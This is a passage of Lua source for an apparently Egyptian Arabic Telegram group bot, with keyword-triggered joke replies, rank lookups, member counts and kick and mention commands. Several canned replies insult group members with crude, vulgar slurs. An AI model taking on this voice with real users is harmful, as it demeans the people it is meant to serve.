send(msg.chat_id_,msg.id_,'◉ انت مطور يقلبيتي..🌚💘')
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_,'◉ نت المالك ونملكك..🥺💘')
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_,'◉ انت المنشئ ياروحي ..🥺💘')
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_,'◉ انت المنشئ الاساسي ياسطا..😹💘')
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_,'◉ نت مدير واحلا مدير..🥺♥️')
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_,'◉ انت ادمن الله يسهلو..😹💘')
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_,'◉ نت عضو مميز يعني متميز..😹💘')
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_,'◉ انت عضو قمر هنا..😹💘')
return false
end

if text == "تفعيل ردود السورس"  then
if Constructor(msg) then  
database:set(bot_id.."my_GHoeq2:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ◉تـم تـفعـيل ردود السورس") 
return false  
end
end
if text == "تعطيل ردود السورس"  then
if Constructor(msg) then  
database:del(bot_id.."my_GHoeq2:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ◉ تـم تـعـطـيل ردود السورس") 
return false end
end

if text == 'تيست' then 
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, ' البوت شغال ') 
return false
end

if text == 'سلام' then 
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ متبقاش تقطع الجوبات..😂💘') 
return false
end

if text == 'عامل اي' then 
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ عامل جمعيه..🙄💘 ') 
return false
end

if text == 'هاي' or text == 'هااي' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'خالتك جريت وراي..😹✋ ') 
return false
end

if text == 'باي' or text == 'بيي' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ باي ياحته مني..🥺💘') 
return false
end

if text == 'طيب' or text == 'تيب' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'فرح خالتك قريب..😂♥️ ') 
return false
end

if text == 'شكرا' or text == 'ميرسي' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ العفو ياروحي..🌚💘') 
return false
end

if text == 'هلو' or text == 'هلا' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ هلا بيك ياروحي..💛') 
return false
end

if text == 'تمم' or text == 'تمام' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ دايما ياحبيبي..🌚💜') 
return false
end

if text == 'حصل' or text == 'حصل😂' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ محصلش بطل تطبيل..🙄💘') 
return false
end

if text == 'زخرفه' or text == 'زخرفة' then
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه الفا') 
return false
end

if text == 'بحبك' or text == 'حبق' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ بعشء امك..🥺💘') 
return false
end

if text == '🙄🙄' or text == '🙄🙄🙄' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ سقف الجروب عاجبك..😂💜') 
return false
end

if text == '😒😒' or text == '😒😒😒' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ افرد وشك المعفن ده..😑💔') 
return false
end

if text == 'دي' or text == 'ده' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ لا مش هي دي..😹🔥') 
return false
end

if text == '.' or text == '..' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ بتنقط لي ياحزين..🙂💔') 
return false
end

if text == 'بف' or text == 'برايفت' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ خدوني تيب..😪💔') 
return false
end

if text == 'بكرهك' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ ونا والله مش طايقك..😒💔')
return false
end

if text == '😂😂😂' or text == '😂😂😂😂' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ دامت ضحكتك يابيبي..🥺💘') 
return false
end

if text == 'اخرصي' or text == 'اخرص' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ هات لازقه احطها ع بوئي..😹♥️ ') 
return false
end

if text == 'فين الادمن' or text == 'الادمن فين' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ فلخاص بيخصخص..😂💘') 
return false
end

if text == 'بتحبني' or text == 'حبيبي' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ بدمنك ياحبيبي..🥺♥️') 
return false
end

if text == 'شش' or text == 'ششش' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ بنهش كتاكيت احنا هنا ولا اي..🐣😹') 
return false
end

if text == 'خلاص' or text == 'خلص' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ خلصت روحك يابعيد..😹💔') 
return false
end

if text then 
list = {'متيجي'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ تؤ تعاله انته..🥺💘') 
return false
end
end
end

if text then 
list = {'متيقي'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ هتخدها فين ياوسخ..🙄💔') 
return false
end
end
end

if text then 
list = {'😳'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ احيه..😳') 
return false
end
end
end


if text then 
list = {'الخير'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'انت الخير ياعمري..❤️ ') 
return false
end
end
end

if text then 
list = {'النبي'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'عليه الصلاه والسلام..💛🙂 ') 
return false
end
end
end

if text == 'جيت' or text == 'انا جيت' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ نورت يروحي..🐼♥️') 
return false
end

if text == 'نعم' or text == 'يانعم' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ مين مؤدب ناوو..😹💘') 
return false
end

if text == '🙂🙂' or text == '🙂💔' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ نت هتنكد لي طيب..🥺💔') 
return false
end

if text == '😹😹😹' or text == '😹😹😹' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ بتضحك علي خيبتك..🙄💘') 
return false
end

if text == 'قلبي' or text == 'ياقلبي' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ تنشك في قلبك بتخوني..🙄💔') 
return false
end

if text == 'بتعمل اي' or text == 'بتعملي اي' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ ونت مالك ياحشري..🙄💘') 
return false
end

if text == 'انتا مين' or text == 'مين' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ انا بوت وبحبك..🥺💘') 
return false
end

if text == 'البوت واقف' or text == 'البوت وقف' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ لا انا شغال متحورش..😒💔') 
return false
end

if text == 'فين' or text == 'انت فين' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ هنا فقلبي..😹♥️') 
return false
end

if text == 'اوف' or text == 'يوه' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ يتي القمر زعلان من اي..🥺🔥') 
return false
end

if text == 'بخ' or text == 'عو' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ يوه خضتني ياسمك اي..🥺💘') 
return false
end

if text == 'احا' or text == 'احااا' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ بالتكت بتعها..🙄💔') 
return false
end

if text == 'بعشقك' or text == 'بموت فيك' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ بدمنك ياعيوني..🥺💘') 
return false
end

if text == 'عيب' or text == 'لا عيب' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ سيب الواد يلعب..🙄💛') 
return false
end

if text == 'هه' or text == 'ههه' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ ضحكه مش سالكه زيك..😹💘') 
return false
end

if text == 'تؤ' or text == 'تؤ تؤ' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ يانوحي يانوحي..🥺💘') 
return false
end

if text then 
list = {'قفل المحن'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'اهلا عزيزي تم قفل المحن بنجاح اتمحونوا بف عشان المراره 😹◉') 
return false
end
end
end

if text then 
list = {'حصلخير'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ يتي كبرت وبقيت بتشبك الكلام..🥺💘') 
return false
end
end
end

if text then 
list = {'انتي مين'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ انا وحده نسوان ونت مين..😂💘') 
return false
end
end
end

if text then 
list = {'كسم'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ عيب ياوسخ..🙄💔') 
return false
end
end
end

if text then 
list = {'دا بوت'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '◉ احيه هو كان مفكرني انسان ولا اي..😹💜') 
return false
end
end
end

if text then 
list = {'فتح المحن'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'اهلا عزيزي تم فتح المحن بنجاح') 
return false
end
end
end

if text == "حلوه"  or text == "حلو" then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'يحلات عيونك..♥️🦋 )')
return false
end

if text then 
list = {'😔'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'متزعلش بحبك..😥♥️ ') 
return false
end
end
end

if text then 
list = {'سلام عليكم'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'وعليكم السلام ..🖤🌚 ') 
return false
end
end
end

if text == ""..(database:get(bot_id..'Name:Bot') or 'كوكايين').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'كوكايين')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس كوكايينو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
'طب متصلي على النبي كدا 🙂💜',
'تع اشرب شاي 🥺💙',
'دوس على الخوخه 🍑',
'متيجي 😉',
'ياض خش نام 😂',
'انا '..Namebot..' احسن البوتات 🤩♥️',
'نعم'
} 
Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?cocainetgroup=new"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
end 
end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
end
if text == "بوت" or text == 'البوت' then 
local Namebot = (database:get(bot_id..'Name:Bot') or 'الفا') 
local DRAGON_Msg = { 
' اي يروحي انا '..Namebot..'🥷🌚♥',
} 
Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
end 
end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
end

if text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = ' ◉ اسمك الاول ← {`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = ' ◉ اسمك الثاني ← {`'..result.last_name_..'`}' 
else
last_name = ''
end      
send(msg.chat_id_, msg.id_,first_name..'\n'..last_name) 
end,nil)
end 
if text == 'بايو' then   
send(msg.chat_id_, msg.id_,getbio(msg.sender_user_id_)) 
end 
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,' ◉ ايديك ← '..msg.sender_user_id_)
end
if text == 'الرتبه' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'*- العضو ← (*'..username..'*)\n- الرتبه ← ('..rtp..')*\n')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^الرتبه @(.*)$") then
local username = text:match("^الرتبه @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'*- العضو ← (*'..username..'*)\n- الرتبه ← ('..rtp..')*\n')
end,nil)
else
send(msg.chat_id_, msg.id_,'- المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 then 
function start_function(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data)  
local Text = { 
"سعر الكشف 150 ج \nههه بهزر معاك يا عم من غير فلوس طبعا ❤️😂", 
"سعر الكشف 20 جني مش منزل عن كدا 😒", 
"سعر الكشف مجاني لانك فقير مجلخ 😂", 
"مبروك المدام حامل 😂", 
} 
local ttt = Text[math.random(#Text)] 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_) 
local username = ('[@'..data.username_..']' or 'لا يوجد') 
local iduser = result.sender_user_id_ 
send(msg.chat_id_, msg.id_,' ◉ الايدي ⤌ ('..iduser..')\n ◉ المعرف ⤌ ('..username..')\n ◉ الرتبه ⤌ ('..rtp..')\n ◉ نوع الكشف ⤌ بالرد\n ◉ '..ttt..' ') 
end,nil) 
end 
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil) 
end
---------
if text and text:match("^كشف (.*)$") then 
local userid = text:match("^كشف (.*)$") 
function start_function(extra, result, success) 
if userid then 
tdcli_function ({ID = "GetUser",user_id_ = userid},function(extra,data)  
local rtp = Rutba(userid,msg.chat_id_) 
local username = ('[@'..data.username_..']' or 'لا يوجد') 
local iduser = userid 
send(msg.chat_id_, msg.id_,' ◉الايدي ← ('..iduser..')\n◉المعرف ← ('..username..')\n◉الرتبه ← ('..rtp..')\n◉نوع الكشف ← بالمعرف') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,' ◉المعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text==('عدد الجروب') and Mod(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_," ◉ البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local sofi = ' ◉ عدد الادمنيه : '..data.administrator_count_..
'\n\n ◉ عدد المطرودين : '..data.kicked_count_..
'\n\n ◉ عدد الاعضاء : '..data.member_count_..
'\n\n ◉ عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n ◉  اسم الجروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, sofi) 
end,nil)
end,nil)
end 
if text == 'اطردني' or text == 'طلعني' then
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
if Can_or_NotCan(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ◉ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,' ◉ عذرا لا استطيع طرد ادمنية الجروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,' ◉ تم طردك من الجروب') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل امر اطردني') 
end
end
if text and text:match("^صيح (.*)$") then
local username = text:match("^صيح (.*)$") 
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,' ◉ المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,' ◉ لا استطيع اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,' ◉ لا استطيع اصيح معرف بوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'⚠| لا اسطيع صيح معرفات الجروبات') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,' ◉ 😾تع يعم كلم الود دا قرفني [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل امر صيح') 
end
return false
end

if string.find(text,"مين ضافني") or string.find(text,"ضفني") then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,' ◉ انت منشئ الجروب') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' ◉ هوا ابن الكلب دا الي ضافك😹← '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' ◉ انت دخلت عبر الرابط يوسخ 🌝') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل امر  مين ضافني') 
end
end

if text == 'مين ضافني هنا' then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,' ◉ انت منشئ الجروب') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' ◉ هوا ابن الكلب دا الي ضافك😹← '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' ◉ انت دخلت عبر الرابط يوسخ 🌝') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل امر  مين ضافني') 
end
end

if text == 'تفعيل ضافني' and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = ' ◉ تم تفعيل امر مين ضافني '
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ضافني' and Manager(msg) then  
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
database:set(bot_id..'Added:Me'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل امر مين ضافني '
else
Text = '\n ◉ بالتاكيد تم تعطيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = ' ◉ تم تفعيل امر صيح'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل امر صيح'
end
